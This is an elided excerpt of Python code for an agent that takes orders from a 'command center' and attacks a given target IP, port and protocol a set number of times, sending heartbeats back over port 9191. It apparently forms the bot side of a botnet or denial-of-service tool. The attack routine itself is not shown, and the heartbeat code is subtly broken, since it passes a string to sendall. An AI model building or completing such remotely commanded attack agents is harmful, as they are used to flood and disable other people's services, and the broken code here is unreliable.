...
class AgentInstance:
                ...
                while True:   
                    if data:
                        ...
                        #Attack the target
                            ...
                            print(f"\033[1;95mDebug: Instructed to attack '{data['TARGET'].upper()}' on protocol: '{data['PROTOCOL'].upper()}' * '{data['HITS']}' times")
                            ...
                            rtt_data = self.attack(PROTOCOL=data['PROTOCOL'], IP=data["TARGET"], PORT=data["PORT"], HITS=data['HITS'])
                            ...
                            if not self.COMMAND_CENTER:
                                print("This is probably because you tried to initiate attacks without registering the command center first")
                            break
    ...
    #Send HeartBeats to the command center to prove online / health status
    def send_heartbeat(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                #Send data to Command Center to confirm successful registration
                success_message = {"REGISTRATION": "SUCCESS"}
                success_message = json.dumps(success_message)
                #Connect to the command center and send the success message to confirm registration
                s.connect((self.COMMAND_CENTER, 9191))
                s.sendall(success_message)
                #close the connection
                s.close()
            except Exception as e:
